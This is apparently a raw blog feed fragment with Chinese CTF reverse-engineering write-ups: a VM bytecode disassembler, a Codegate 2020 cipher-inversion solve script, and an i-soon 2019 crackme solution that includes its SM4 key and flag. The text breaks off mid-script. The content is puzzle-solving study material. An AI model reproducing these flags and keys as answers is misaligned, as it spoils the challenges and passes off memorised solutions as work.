class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c_char</span><span class="params">(c)</span>:</span></span><br><span class="line"><span class="keyword">assert</span>(len(c)==<span class="number">1</span>)</span><br><span class="line">tmp = ord(c)</span><br><span class="line"><span class="keyword">if</span> tmp &gt;= <span class="number">128</span>:</span><br><span class="line">tmp -= <span class="number">256</span></span><br><span class="line"><span class="keyword">return</span> tmp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disam</span><span class="params">(code)</span>:</span></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="keyword">print</span> hex(len(code))</span><br><span class="line"><span class="keyword">while</span>(count&lt;len(code)):</span><br><span class="line">opcode=ord(code[count])</span><br><span class="line"><span class="keyword">if</span> opcode==<span class="number">1</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'%4x: input and %s'</span>%(count,<span class="string">"push"</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">2</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'%4x: putc and %s'</span>%(count,<span class="string">"pop"</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">3</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'%4x: nop '</span>%(count)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">4</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'%4x: %s'</span>%(count,<span class="string">"push &#123;:#x&#125;"</span>.format(ord(code[count+<span class="number">1</span>])))</span><br><span class="line">count+=<span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">7</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'%4x: %s'</span>%(count,<span class="string">"push memory[&#123;:#x&#125;]"</span>.format(ord(code[count+<span class="number">1</span>])))</span><br><span class="line">count+=<span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">8</span>:</span><br><span class="line"> <span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"pop memory[&#123;:#x&#125;]"</span>.format(ord(code[count+<span class="number">1</span>])))</span><br><span class="line"> count+=<span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">6</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"pop reg[&#123;:#x&#125;]"</span>.format(ord(code[count+<span class="number">1</span>])))</span><br><span class="line">count+=<span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">5</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"push reg[&#123;:#x&#125;]"</span>.format(ord(code[count+<span class="number">1</span>])))</span><br><span class="line">count+=<span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0x13</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"if stack[top]==stack[top-1] goto &#123;:#x&#125; stack-2"</span>.format(count+ord(code[count+<span class="number">1</span>])))</span><br><span class="line">count+=<span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0x14</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"if stack[top]!=stack[top-1] goto &#123;:#x&#125; stack-2"</span>.format(count+ord(code[count+<span class="number">1</span>])))</span><br><span class="line">count+=<span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0x15</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"if stack[top]&gt;stack[top-1] goto &#123;:#x&#125; stack-2"</span>.format(count+ord(code[count+<span class="number">1</span>])))</span><br><span class="line">count+=<span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0x16</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"if stack[top]&lt;=stack[top-1] goto &#123;:#x&#125; stack-2"</span>.format(count+ord(code[count+<span class="number">1</span>])))</span><br><span class="line">count+=<span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0x17</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"if stack[top]&lt;stack[top-1] goto &#123;:#x&#125; stack-2"</span>.format(count+ord(code[count+<span class="number">1</span>])))</span><br><span class="line">count+=<span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0x18</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"if stack[top]&gt;=stack[top-1] goto &#123;:#x&#125; stack-2"</span>.format(count+ord(code[count+<span class="number">1</span>])))</span><br><span class="line">count+=<span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0xa</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"push stack[top-1]-stack[top]  stack-1"</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0xb</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"push stack[top]*stack[top-1]  stack-1"</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0xc</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"push stack[top-1]/stack[top]  stack-1"</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0xd</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"push stack[top-1]%stack[top]  stack-1"</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0xe</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"push stack[top-1]^stack[top]  stack-1"</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0x11</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"stack[top]=-stack[top]"</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">9</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"push stack[top-1]+stack[top]  stack-1"</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0x19</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"stack[top]= memory[stack[top]]"</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0x12</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"stack[top]=~stack[top]"</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0xf</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"push stack[top]&amp;stack[top-1]  stack-1"</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0x10</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"push stack[top]|stack[top-1]  stack-1"</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0x1b</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"stack[top]=regs[stack[top]]"</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0x1a</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"memory[stack[top]]=[stack[top-1]]"</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0x1c</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"reg[stack[top]]=[stack[top-1]]"</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> opcode==<span class="number">0x1d</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%4x: %s"</span> % (count, <span class="string">"jmp &#123;:#x&#125;"</span>.format((count+c_char(code[count+<span class="number">1</span>]))))</span><br><span class="line">count+=<span class="number">2</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> hex(opcode)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"code"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">code = f.read()</span><br><span class="line">disam(code)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;enc&quot;&gt;&lt;a href=&quot;#enc&quot; class=&quot;headerlink&quot; title=&quot;enc&quot;&gt;&lt;/a&gt;enc&lt;/h3&gt;&lt;p&gt;这个题需要记录两点:&lt;/p&gt;
&lt;p&gt;1.碰到一时识别不了的加密算法尝试用angr莽?&lt;/p&gt;
&lt;p&gt; 2.rc6算法特点:很多ROL</summary>
      
    
    
    
    <category term="ctf wp" scheme="http://pidanxu.github.io/categories/ctf-wp/"/>
    
    
    <category term="reverse" scheme="http://pidanxu.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>codegate2020</title>
    <link href="http://pidanxu.github.io/2020/02/11/codegate2020/"/>
    <id>http://pidanxu.github.io/2020/02/11/codegate2020/</id>
    <published>2020-02-11T07:26:27.000Z</published>
    <updated>2020-02-11T07:29:55.978Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="RS"><a href="#RS" class="headerlink" title="RS"></a>RS</h3><p>rust逆向，没逆国rust逆向，参考<a href="https://blog.csdn.net/qq_33438733/article/details/81138573" target="_blank" rel="noopener">https://blog.csdn.net/qq_33438733/article/details/81138573</a> 现学现做</p><p>总的来说，盯死密文产生的内存位置，确定到关键函数就出了，还是挺简单的。逆向的时候把地址随机化关了会方便很多。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_55eab0</span><span class="params">(a1,a2)</span>:</span></span><br><span class="line">v3=<span class="number">0</span></span><br><span class="line">v4=a1</span><br><span class="line">v5=a2</span><br><span class="line"><span class="keyword">while</span>(v5):</span><br><span class="line"><span class="keyword">if</span>(v5%<span class="number">2</span>!=<span class="number">0</span>):</span><br><span class="line">v3=v3^v4</span><br><span class="line">v5=v5&gt;&gt;<span class="number">1</span></span><br><span class="line">v4=v4*<span class="number">2</span></span><br><span class="line"><span class="keyword">if</span>(v4&gt;=<span class="number">0x100</span>):</span><br><span class="line">v4=v4^<span class="number">0x11d</span></span><br><span class="line"><span class="keyword">return</span> v3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re_my_55eab0</span><span class="params">(a1,a2)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0xff</span>):</span><br><span class="line"><span class="keyword">if</span> my_55eab0(a1,i)==a2:</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="string">'''aa=my_55eab0(3,66)</span></span><br><span class="line"><span class="string">bb=re_my_55eab0(3,aa)</span></span><br><span class="line"><span class="string">print bb'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_55ea90</span><span class="params">(a1,a2)</span>:</span></span><br><span class="line"><span class="keyword">return</span> a1^a2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_block_encrypt</span><span class="params">(msg,tmp_ci)</span>:</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">v37=msg[i+<span class="number">1</span>+j]</span><br><span class="line">v35=tmp_ci[i+<span class="number">1</span>]</span><br><span class="line">v33=msg[j]</span><br><span class="line">v22=my_55eab0(v35,v33)</span><br><span class="line">v23=my_55ea90(v37,v22)</span><br><span class="line">msg[i+<span class="number">1</span>+j]=v23</span><br><span class="line"></span><br><span class="line"><span class="string">'''tmp=my_55eab0(0x36,0x37)</span></span><br><span class="line"><span class="string">print hex(tmp)'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_block_decrypt</span><span class="params">(ci,tmp_ci)</span>:</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">0</span>):</span><br><span class="line">v1=ci[<span class="number">47</span>-i-j]</span><br><span class="line">v2=<span class="number">0</span>^v1</span><br><span class="line">v3=tmp_ci[<span class="number">32</span>-i]</span><br><span class="line">v33=re_my_55eab0(v3,v2)</span><br><span class="line"><span class="keyword">print</span> v33,i,j,v3,v2</span><br><span class="line">ci[<span class="number">15</span>-j]=v33</span><br><span class="line">v35=tmp_ci[<span class="number">32</span>-i]</span><br><span class="line">v22=my_55eab0(v35,ci[<span class="number">15</span>-j])</span><br><span class="line"><span class="comment">#print v22,ci[47-i-j],47-i-j,ci</span></span><br><span class="line">ci[<span class="number">47</span>-i-j]=ci[<span class="number">47</span>-i-j]^v22</span><br><span class="line">tmp_ci=[<span class="number">0x01</span>,<span class="number">0x74</span>,<span class="number">0x40</span>,<span class="number">0x34</span>,<span class="number">0xAE</span>,<span class="number">0x36</span>,<span class="number">0x7E</span>,<span class="number">0x10</span>,<span class="number">0xC2</span>,<span class="number">0xA2</span>,<span class="number">0x21</span>,<span class="number">0x21</span>,<span class="number">0x9D</span>,<span class="number">0xB0</span>,<span class="number">0xC5</span>,<span class="number">0xE1</span>,<span class="number">0xC</span>,<span class="number">0x3B</span>,<span class="number">0x37</span>,<span class="number">0xFD</span>,<span class="number">0xE4</span>,<span class="number">0x94</span>,<span class="number">0x2F</span>,<span class="number">0xB3</span>,<span class="number">0xB9</span>,<span class="number">0x18</span>,<span class="number">0x8A</span>,<span class="number">0xFD</span>,<span class="number">0x14</span>,<span class="number">0x8E</span>,<span class="number">0x37</span>,<span class="number">0xAC</span>,<span class="number">0x58</span>]</span><br><span class="line">msg=[<span class="number">0xA</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">res=my_block_encrypt(msg,tmp_ci)</span><br><span class="line"><span class="comment">#print map(hex,msg)</span></span><br><span class="line">block_ci=msg[<span class="number">16</span>:]</span><br><span class="line"><span class="keyword">print</span> map(hex,block_ci)</span><br><span class="line">ci=[<span class="number">0xef</span>,<span class="number">0x43</span>,<span class="number">0x4b</span>,<span class="number">0x3f</span>,<span class="number">0x5e</span>,<span class="number">0xb9</span>,<span class="number">0xf0</span>,<span class="number">0xd0</span>,<span class="number">0x8c</span>,<span class="number">0xb5</span>,<span class="number">0x7e</span>,<span class="number">0x6f</span>,<span class="number">0x7b</span>,<span class="number">0xc8</span>,<span class="number">0xa6</span>,<span class="number">0x7b</span>,<span class="number">0x09</span>,<span class="number">0xe2</span>,<span class="number">0x61</span>,<span class="number">0x9d</span>,<span class="number">0x98</span>,<span class="number">0x03</span>,<span class="number">0x5f</span>,<span class="number">0x56</span>,<span class="number">0x5d</span>,<span class="number">0x66</span>,<span class="number">0x82</span>,<span class="number">0x0b</span>,<span class="number">0x9e</span>,<span class="number">0x2b</span>,<span class="number">0x76</span>,<span class="number">0x92</span>,<span class="number">0x5b</span>,<span class="number">0xc3</span>,<span class="number">0xdc</span>,<span class="number">0xf2</span>,<span class="number">0x3c</span>,<span class="number">0xd0</span>,<span class="number">0xb6</span>,<span class="number">0x81</span>,<span class="number">0x60</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0x66</span>,<span class="number">0xca</span>,<span class="number">0xbd</span>,<span class="number">0x7d</span>,<span class="number">0x6a</span>,<span class="number">0x00</span>,<span class="number">0xfe</span>,<span class="number">0xe4</span>,<span class="number">0x0b</span>,<span class="number">0x44</span>,<span class="number">0xe1</span>,<span class="number">0xba</span>,<span class="number">0x81</span>,<span class="number">0xcb</span>,<span class="number">0xae</span>,<span class="number">0x8b</span>,<span class="number">0x24</span>,<span class="number">0x0b</span>,<span class="number">0xa5</span>,<span class="number">0x1f</span>,<span class="number">0x6d</span>,<span class="number">0xba</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x1a</span>,<span class="number">0x30</span>,<span class="number">0xa7</span>,<span class="number">0x77</span>,<span class="number">0x51</span>,<span class="number">0x23</span>,<span class="number">0x41</span>,<span class="number">0xa6</span>,<span class="number">0x1a</span>,<span class="number">0xc0</span>,<span class="number">0x7f</span>,<span class="number">0x71</span>,<span class="number">0x71</span>,<span class="number">0x9f</span>,<span class="number">0xd5</span>,<span class="number">0x93</span>,<span class="number">0xe5</span>,<span class="number">0x38</span>,<span class="number">0xce</span>,<span class="number">0x52</span>,<span class="number">0x8b</span>,<span class="number">0x25</span>,<span class="number">0x86</span>,<span class="number">0xb3</span>,<span class="number">0x12</span>,<span class="number">0xb7</span>,<span class="number">0xa7</span>,<span class="number">0x1c</span>,<span class="number">0x43</span>,<span class="number">0xb4</span>,<span class="number">0x08</span>,<span class="number">0x81</span>,<span class="number">0x47</span>,<span class="number">0xae</span>,<span class="number">0xd6</span>,<span class="number">0x18</span>,<span class="number">0x46</span>,<span class="number">0xc5</span>,<span class="number">0x6b</span>,<span class="number">0x69</span>,<span class="number">0x63</span>,<span class="number">0x0b</span>,<span class="number">0xcc</span>,<span class="number">0x95</span>,<span class="number">0xab</span>,<span class="number">0x49</span>,<span class="number">0x53</span>,<span class="number">0x6f</span>,<span class="number">0xde</span>,<span class="number">0xbe</span>,<span class="number">0x2f</span>,<span class="number">0x2e</span>,<span class="number">0xd9</span>,<span class="number">0x9b</span>,<span class="number">0xdc</span>,<span class="number">0xdd</span>,<span class="number">0x76</span>,<span class="number">0x69</span>,<span class="number">0xa4</span>,<span class="number">0xf0</span>,<span class="number">0x58</span>]</span><br><span class="line">t_ci=[]</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">t_ci=[]</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">t_ci.append(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>*i,<span class="number">32</span>*(i+<span class="number">1</span>)):</span><br><span class="line">t_ci.append(ci[k])</span><br><span class="line">my_block_decrypt(t_ci,tmp_ci)</span><br><span class="line"><span class="keyword">print</span> map(chr,t_ci)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">flag+=chr(t_ci[k])</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;Reverse&quot;&gt;&lt;a href=&quot;#Reverse&quot; class=&quot;headerlink&quot; title=&quot;Reverse&quot;&gt;&lt;/a&gt;Reverse&lt;/h2&gt;&lt;h3 id=&quot;RS&quot;&gt;&lt;a href=&quot;#RS&quot; class=&quot;headerl</summary>
      
    
    
    
    <category term="ctf" scheme="http://pidanxu.github.io/categories/ctf/"/>
    
    
    <category term="codegate" scheme="http://pidanxu.github.io/tags/codegate/"/>
    
  </entry>
  
  <entry>
    <title>i-soonctf2019</title>
    <link href="http://pidanxu.github.io/2019/11/30/i-soonctf2019/"/>
    <id>http://pidanxu.github.io/2019/11/30/i-soonctf2019/</id>
    <published>2019-11-30T12:29:17.000Z</published>
    <updated>2019-11-30T12:49:48.567Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h3><p>SM4算法，密钥为where_are_u_now?,密文经过魔改base64编码后进行对比验证。</p><p>求SM4密文脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">b64 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">table =<span class="string">'yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tb64encode</span><span class="params">(s)</span>:</span></span><br><span class="line">tmp = b64encode(s)</span><br><span class="line"></span><br><span class="line">ans = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">ans += table[b64.index(i)]</span><br><span class="line"><span class="keyword">print</span> ans</span><br><span class="line"><span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tb64decode</span><span class="params">(s)</span>:</span></span><br><span class="line">ans = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line"><span class="comment">#print i</span></span><br><span class="line">ans += b64[table.index(i)]</span><br><span class="line"><span class="keyword">print</span> ans</span><br><span class="line"><span class="keyword">return</span> base64.b64decode(ans+<span class="string">'=='</span>)</span><br><span class="line"><span class="keyword">print</span> tb64decode(<span class="string">'U1ATIOpkOyWSvGm/YOYFR4'</span>).encode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><p>然后SM4解密得flag</p><p><img src="https://i.loli.net/2019/11/30/bV1P9v7S2nmO5FI.png" alt="1.png"></p><p>flag:SM4foRExcepioN?!</p><h3 id="Easy-Encryption"><a href="#Easy-Encryption" class="headerlink" title="Easy_Encryption"></a>Easy_Encryption</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">v3=[<span class="number">0x20</span>,<span class="number">0x1F</span>,<span class="number">0x1E</span>,<span class="number">0x1D</span>,<span class="number">0x1C</span>,<span 